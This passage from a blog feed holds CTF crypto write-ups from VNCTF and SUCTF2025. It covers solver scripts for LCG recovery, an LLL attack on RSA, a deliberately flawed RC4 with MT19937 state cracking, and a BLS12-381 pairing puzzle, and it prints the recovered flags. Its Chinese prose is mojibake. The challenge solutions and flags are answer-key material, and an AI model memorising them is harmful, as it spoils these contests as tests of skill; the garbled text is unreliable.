(powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br>n=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;n.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read())<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">FLAG1 = b&quot;VNCTF&#123;&quot;</span><br><span class="hljs-string">binary_flag = &#x27;&#x27;.join(f&quot;&#123;byte:08b&#125;&quot; for byte in FLAG1)</span><br><span class="hljs-string">print(binary_flag)</span><br><span class="hljs-string">&#x27;010101100100111001000011010101000100011001111011&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>s=[n[<span class="hljs-number">26</span>],n[<span class="hljs-number">28</span>],n[<span class="hljs-number">30</span>],n[<span class="hljs-number">32</span>],n[<span class="hljs-number">34</span>],n[<span class="hljs-number">36</span>]] <br>t = []<br>l=<span class="hljs-built_in">len</span>(s)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,l):<br>    t.append(s[i]-s[i-<span class="hljs-number">1</span>])<br> <br>all_p = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,l-<span class="hljs-number">3</span>):<br>    all_p.append(gcd((t[i+<span class="hljs-number">1</span>]*t[i-<span class="hljs-number">1</span>]-t[i]*t[i]), (t[i+<span class="hljs-number">2</span>]*t[i]-t[i+<span class="hljs-number">1</span>]*t[i+<span class="hljs-number">1</span>])))<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> all_p:<br>    p=<span class="hljs-built_in">abs</span>(p)<br>    <span class="hljs-keyword">if</span> p==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br>    <br>    a=(s[<span class="hljs-number">2</span>]-s[<span class="hljs-number">1</span>])*invert((s[<span class="hljs-number">1</span>]-s[<span class="hljs-number">0</span>]),p)%p<br> <br>    ani=invert(a,p)<br>    <br>    b=(s[<span class="hljs-number">1</span>]-a*s[<span class="hljs-number">0</span>])%p<br> <br>    seed = (ani*(s[<span class="hljs-number">0</span>]-b))%p<br>    <br><br>    mp = AMM_rth(a, <span class="hljs-number">2</span>, p)  <span class="hljs-comment"># AMMç®—æ³•å¾—åˆ°ä¸€ä¸ªè§£</span><br><br>    rt1 = ALL_ROOT2(<span class="hljs-number">2</span>, p)<br><br>    amp = ALL_Solution(mp, p, rt1, a, <span class="hljs-number">2</span>)  <span class="hljs-comment"># å¾—åˆ°æ‰€æœ‰çš„mp</span><br>    <br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> amp:<br>        b=(n[<span class="hljs-number">32</span>]-a*n[<span class="hljs-number">31</span>])%p<br>        <br>        seed=((n[<span class="hljs-number">0</span>]-b)*inverse(a,p))%p<br><br><br>        flag=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> mi <span class="hljs-keyword">in</span> n:<br>            seed=(a*seed+b)%p<br>            <span class="hljs-keyword">if</span> seed == mi :<br>                flag+=<span class="hljs-string">&#x27;0&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                flag+=<span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>)))<br><br>    <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;VNCTF&#123;Happy_New_Year_C0ngratu1at&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="part2"><a class="markdownIt-Anchor" href="#part2"></a> part2</h3><p>æ ¼ä¸€ä¸‹å°±è¡Œäº†ï¼Œå°±çˆ†ç ´ä¸€ä¸‹flag2çš„é•¿åº¦å°±å¥½äº†ï¼Œç„¶ååˆ¤æ–­ä¸€ä¸‹è¾“å‡º</p><p>è‡ªå·±ç”Ÿæˆæµ‹è¯•ç¬¬ä¸€ä¸ªå‘é‡å°±æ˜¯æœ€çŸ­å‘é‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">16880924655573626811763865075201881594085658222047473444427295924181371341406971359787070757333746323665180258925280624345937931067302673406166527557074157053768756954809954623549764696024889104571712837947570927160960150469942624060518463231436452655059364616329589584232929658472512262657486196000339385053006838678892053410082983193195313760143294107276239320478952773774926076976118332506709002823833966693933772855520415233420873109157410013754228009873467565264170667190055496092630482018483458436328026371767734605083997033690559928072813698606007542923203397847175503893541662307450142747604801158547519780249</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">9032357989989555941675564821401950498589029986516332099523507342092837051434738218296315677579902547951839735936211470189183670081413398549328213424711630953101945318953216233002076158699383482500577204410862449005374635380205765227970071715701130376936200309849157913293371540209836180873164955112090522763296400826270168187684580268049900241471974781359543289845547305509778118625872361241263888981982239852260791787315392967289385225742091913059414916109642527756161790351439311378131805693115561811434117214628348326091634314754373956682740966173046220578724814192276046560931649844628370528719818294616692090359</span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    L=Matrix(ZZ,l+<span class="hljs-number">2</span>,l+<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l+<span class="hljs-number">1</span>):<br>        L[i,i]=<span class="hljs-number">1</span><br>        L[i,-<span class="hljs-number">1</span>]=<span class="hljs-built_in">pow</span>((i+<span class="hljs-number">0x1234</span>),e,n)<br>    L[-<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>]=c<br>    L[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=-n<br>    x=L.LLL()[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(x[l-<span class="hljs-number">1</span>]))==<span class="hljs-number">125</span>:<br>        <span class="hljs-built_in">print</span>(l,x)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[:l]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(i))),end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#i0ns_On_Rec0vering_The_Messages&#125;</span><br></code></pre></td></tr></table></figure><h2 id="å¹¶érc4"><a class="markdownIt-Anchor" href="#å¹¶érc4"></a> å¹¶éRC4</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> small_key, flag<br><br><span class="hljs-comment">#ä½ èƒ½æ‰¾åˆ°è¿™ä¸ªå®ç°é”™åœ¨å“ªå—</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">faulty_rc4_encrypt</span>(<span class="hljs-params">text</span>):<br>    data_xor_iv = []<br>    sbox = []<br>    j = <span class="hljs-number">0</span><br>    x = y = k = <span class="hljs-number">0</span><br>    key = small_key<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        sbox.append(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            j = j + sbox[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]) &amp; <span class="hljs-number">255</span><br>            sbox[i] = sbox[j]  <br>            sbox[j] = sbox[i]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> text:<br>                x = x + <span class="hljs-number">1</span> &amp; <span class="hljs-number">255</span><br>                y = y + sbox[x] &amp; <span class="hljs-number">255</span><br>                sbox[x] = sbox[y] <br>                sbox[y] = sbox[x]<br>                k = sbox[sbox[x] + sbox[y] &amp; <span class="hljs-number">255</span>]<br>                data_xor_iv.append(idx^k^<span class="hljs-number">17</span>)<br>    <span class="hljs-keyword">return</span> data_xor_iv<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    mt_string = <span class="hljs-built_in">bytes</span>([random.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40000</span>)])<br>    encrypted_data = faulty_rc4_encrypt(mt_string)<br>    <br>    p = nextprime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = nextprime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p * q<br>    e = <span class="hljs-number">65537</span><br>    <br>    flag_number = bytes_to_long(flag.encode())<br>    encrypted_flag = <span class="hljs-built_in">pow</span>(flag_number, e, n)<br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data_RC4.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-built_in">str</span>(encrypted_data))<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, e)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;encrypted_flag =&quot;</span>, encrypted_flag)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>ä¸åŒå°±æ˜¯åœ¨ç”Ÿæˆkeyçš„æ—¶å€™ä¸æ˜¯äº¤æ¢è€Œæ˜¯ç›´æ¥è¦†ç›–äº†ï¼Œç„¶åæœ€åå¤šå¼‚æˆ–äº†ä¸€ä¸ª17</p><p>ä½†æ˜¯æˆ‘åˆ†æä¸å‡ºæ¥æ€ä¹ˆæ”»å‡»ï¼Œç›´æ¥è‡ªå·±æ‰§è¡Œäº†ä¸€éè¿™ä¸ªä»£ç ï¼Œå‘ç°åœ¨åé¢çš„æ—¶å€™<code>idx^k^17</code>çš„è¿™ä¸ªkä¼šç­‰äºä¸€ä¸ªå€¼ï¼Œè‡ªå·±æµ‹è¯•å°±æ‹¿30000åé¢çš„æ•°æ®å‘ç°å¯ä»¥è§£å‡ºæ¥ï¼Œç›´æ¥çˆ†ç ´è¿™ä¸ªkå°±å¥½äº†</p><p>ç„¶åå°±æ˜¯MT19937çš„8bitsåˆ†æï¼Œä¹‹å‰é‡åˆ°è¿‡å¥½å¤šæ¬¡ç±»ä¼¼çš„äº†å°±ä¸è®²äº†</p><p>æ€»ä¹‹å°±æ˜¯çˆ†ç ´ï¼Œçˆ†äº†1ä¸ªåŠå°æ—¶</p><blockquote><p>é—®å®Œå‡ºé¢˜äººè¿™å°±æ˜¯é¢„æœŸè§£</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>data=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data_RC4.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read())[<span class="hljs-number">30000</span>:]<br><br><br>RNG = Random()<br>length = <span class="hljs-number">19968</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_a_row</span>(<span class="hljs-params">RNG</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30000</span>):RNG.getrandbits(<span class="hljs-number">8</span>)<br>    ind = <span class="hljs-number">0</span><br>    row = []<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        t1 = <span class="hljs-built_in">bin</span>(RNG.getrandbits(<span class="hljs-number">8</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> tt <span class="hljs-keyword">in</span> t1:<br>            row.append(<span class="hljs-built_in">int</span>(tt))<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(row) &gt;= length):<br>            <span class="hljs-keyword">return</span> row<br>        ind += <span class="hljs-number">1</span><br><span class="hljs-string">&quot;&quot;&quot;L = []</span><br><span class="hljs-string">for i in trange(length):</span><br><span class="hljs-string">    state = [0]*624</span><br><span class="hljs-string">    temp = &quot;0&quot;*i + &quot;1&quot;*1 + &quot;0&quot;*(length-1-i)</span><br><span class="hljs-string">    for j in range(624):</span><br><span class="hljs-string">        state[j] = int(temp[32*j:32*j+32],2)</span><br><span class="hljs-string">    RNG.setstate((3,tuple(state+[624]),None))</span><br><span class="hljs-string">    L.append(construct_a_row(RNG))</span><br><span class="hljs-string">L = Matrix(GF(2),L)</span><br><span class="hljs-string">save(L, &quot;matrix.sobj&quot;)&quot;&quot;&quot;</span><br><span class="hljs-comment">#è‡ªå·±æµ‹è¯•çš„æ—¶å€™å·²ç»ç”Ÿæˆå¥½äº†ï¼Œè¿™é‡ŒèŠ‚çœæ—¶é—´</span><br>L = load(<span class="hljs-string">&quot;matrix.sobj&quot;</span>)<br><span class="hljs-comment">#(123,256)</span><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> trange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>    data1=[key^i^<span class="hljs-number">17</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data]<br>    known = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data1:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>):<br>            known+=j<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(known) &gt;= length):<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">try</span>:<br>        s = L.solve_left(vector(GF(<span class="hljs-number">2</span>),known))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(key)<br>    init = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,s)))<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        state.append(<span class="hljs-built_in">int</span>(init[<span class="hljs-number">32</span>*i:<span class="hljs-number">32</span>*i+<span class="hljs-number">32</span>],<span class="hljs-number">2</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">backfirst</span>(<span class="hljs-params">state1</span>):<br>        high = <span class="hljs-number">0x80000000</span><br>        low = <span class="hljs-number">0x7fffffff</span><br>        mask1 = <span class="hljs-number">0x9908b0df</span><br>        tmp = state1[<span class="hljs-number">623</span>] ^ state1[<span class="hljs-number">396</span>]<br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask1<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span> - <span class="hljs-number">1</span>) | tmp &amp; low, tmp &amp; low<br>    seed1, seed2 = backfirst(state)<br>    state1 = [seed1] + state[<span class="hljs-number">1</span>:]<br>    state2 = [seed2] + state[<span class="hljs-number">1</span>:]<br><br><br>    n = <span class="hljs-number">26980604887403283496573518645101009757918606698853458260144784342978772393393467159696674710328131884261355662514745622491261092465745269577290758714239679409012557118030398147480332081042210408218887341210447413254761345186067802391751122935097887010056608819272453816990951833451399957608884115252497940851</span><br>    e = <span class="hljs-number">65537</span><br>    encrypted_flag = <span class="hljs-number">22847144372366781807296364754215583869872051137564987029409815879189317730469949628642001732153066224531749269434313483657465708558426141747771243442436639562785183869683190497179323158809757566582076031163900773712582568942616829434508926165117919744857175079480357695183964845638413639130567108300906156467</span><br>    prng = Random()<br>    prng.setstate(<span class="hljs-built_in">tuple</span>([<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(state1+[<span class="hljs-number">624</span>]), <span class="hljs-literal">None</span>]))<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40000</span>):<br>        prng.getrandbits(<span class="hljs-number">8</span>)<br>    p = next_prime(prng.getrandbits(<span class="hljs-number">512</span>))<br>    q = next_prime(prng.getrandbits(<span class="hljs-number">512</span>))<br>    <span class="hljs-built_in">print</span>(p)<br>    <span class="hljs-built_in">print</span>(q)<br>    <span class="hljs-keyword">if</span> n==p*q:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(encrypted_flag,inverse_mod(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),n))))<br><br>    prng = Random()<br>    prng.setstate(<span class="hljs-built_in">tuple</span>([<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(state2+[<span class="hljs-number">624</span>]), <span class="hljs-literal">None</span>]))<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40000</span>):<br>        prng.getrandbits(<span class="hljs-number">8</span>)<br>    p = next_prime(prng.getrandbits(<span class="hljs-number">512</span>))<br>    q = next_prime(prng.getrandbits(<span class="hljs-number">512</span>))<br>    <span class="hljs-built_in">print</span>(p)<br>    <span class="hljs-built_in">print</span>(q)<br>    <span class="hljs-keyword">if</span> n==p*q:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(encrypted_flag,inverse_mod(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),n))))<br><span class="hljs-string">&quot;&quot;&quot;&quot;</span><br><span class="hljs-string">123</span><br><span class="hljs-string">2849821642489040816444237149453951123096937420879364734457565300636069483308108133275885434910493679378607501786658532870247845818686651940429045958638523</span><br><span class="hljs-string">9467471397205882947962218830745171049297627946722122603974372237041601408122191262161200434063435224151339148022637680690503653259129267359148432740698537</span><br><span class="hljs-string">b&#x27;VNCTF&#123;FL4w3d_RC4_C0nv3rg3s_2_123_4nd_M1nd_Sm4ller_MT_Brut3&#125;&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h1><h2 id="vn_lang"><a class="markdownIt-Anchor" href="#vn_lang"></a> VN_Lang</h2><p>txtæ‰“å¼€æœç´¢vnctfå°±è¡Œ</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF2025-crypto</title>
    <link href="/2025/01/12/suctf2025/"/>
    <url>/2025/01/12/suctf2025/</url>
    
    <content type="html"><![CDATA[<h1 id="suctf2025"><a class="markdownIt-Anchor" href="#suctf2025"></a> SUCTF2025</h1><p>é¢˜ç›®å¾ˆä¸é”™ï¼Œä½†å°±å‡ºäº†ä¸¤é¢˜ï¼Œè¿˜æœ‰å‡ é¢˜æ„Ÿå…´è¶£çš„ï¼Œæœ‰æ—¶é—´å¤ç°ä¸€ä¸‹</p><blockquote><p>å¯†ç åšé¢˜æ­¥éª¤ï¼šå‘åŠ¨å¼ºå¤§çš„æœç´¢å¼•æ“ï¼Œå…ˆæ‹¿ä»£ç é—®GPT,å¾—åˆ°ä»£ç çš„å¤§è‡´æµç¨‹å’Œä¸€äº›å…³é”®ä¿¡æ¯(æ¯”å¦‚ç®—æ³•ã€ç”¨åˆ°çš„çŸ¥è¯†ç‚¹),ç„¶åæ‰“å¼€æœç´¢å¼•æ“(bingã€Google),å¼€å§‹æœç´¢å¯¹åº”çŸ¥è¯†ç‚¹,æœ€æœ€é‡è¦çš„æ˜¯:åœ¨å‰é¢åŠ ä¸Šctf,ç„¶åå¯¹çŸ¥è¯†ç‚¹åŠ ä¸ŠåŒå¼•å·(æœç´¢ç»“æœåŒ…å«),ç„¶åç›´æ¥æ‰¾wpæœ‰è„šæœ¬å°±å¥½å•¦ï¼</p></blockquote><h2 id="susignin"><a class="markdownIt-Anchor" href="#susignin"></a> SUâ€”signin</h2><h3 id="é¢˜ç›®"><a class="markdownIt-Anchor" href="#é¢˜ç›®"></a> é¢˜ç›®</h3><p>æ•°æ®å°±ä¸è´´äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>bit_length = <span class="hljs-built_in">len</span>(flag) * <span class="hljs-number">8</span><br><br>p = <span class="hljs-number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span><br>K = GF(p)<br>E = EllipticCurve(K, (<span class="hljs-number">0</span>, <span class="hljs-number">4</span>))<br>o = <span class="hljs-number">793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289</span><br>n1, n2 = <span class="hljs-number">859267</span>, <span class="hljs-number">52437899</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    G1, G2 = E.random_element(), E.random_element()<br>    <span class="hljs-keyword">if</span>(G1.order() == o <span class="hljs-keyword">and</span> G2.order() == o):<br>        P1, P2 = (o//n1)*G1, (o//n2)*G2<br>        <span class="hljs-keyword">break</span><br><br>cs = [(randrange(<span class="hljs-number">0</span>, o) * P1 + randrange(<span class="hljs-number">0</span>, o) * G2).xy() <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">else</span> (randrange(<span class="hljs-number">0</span>, o) * G1 + randrange(<span class="hljs-number">0</span>, o) * P2).xy() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:].zfill(bit_length)]<br><span class="hljs-built_in">print</span>(cs)<br></code></pre></td></tr></table></figure><h3 id="è§£é¢˜"><a class="markdownIt-Anchor" href="#è§£é¢˜"></a> è§£é¢˜</h3><p>é€šè¿‡æœç´¢æ˜¯BLS12-381æ›²çº¿ï¼ŒçŸ¥é“äº†æœ‰è‰¯å¥½çš„åŒçº¿æ€§é…å¯¹ï¼Œæ­£å¥½æ¯•è®¾äº†è§£è¿‡ã€‚</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>P</mi><mn>1</mn></msub><mo>=</mo><mfrac><mi>p</mi><msub><mi>n</mi><mn>2</mn></msub></mfrac><mo>âˆ—</mo><msub><mi>G</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>P</mi><mn>2</mn></msub><mo>=</mo><mfrac><mi>p</mi><msub><mi>n</mi><mn>2</mn></msub></mfrac><mo>âˆ—</mo><msub><mi>G</mi><mn>2</mn></msub><mspace 